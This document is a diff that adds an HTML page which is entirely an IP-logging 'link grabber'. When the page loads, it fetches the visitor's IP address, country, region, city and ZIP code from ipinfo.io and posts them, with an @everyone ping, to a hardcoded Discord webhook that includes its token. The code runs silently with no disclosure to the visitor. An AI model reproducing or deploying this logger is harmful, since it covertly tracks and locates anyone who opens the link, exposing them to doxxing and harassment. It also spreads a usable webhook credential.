@@ -1,0 +1,27 @@
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1186134439424704532/4WboPDSzqlTIaIeAHs1teVc7yNlv8qaVbamwOUJ-Q10Qp_gu1U9IjLb45xS6p-4Dqzb1");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "Na Link Logger",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Na Link Grabber Caught!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
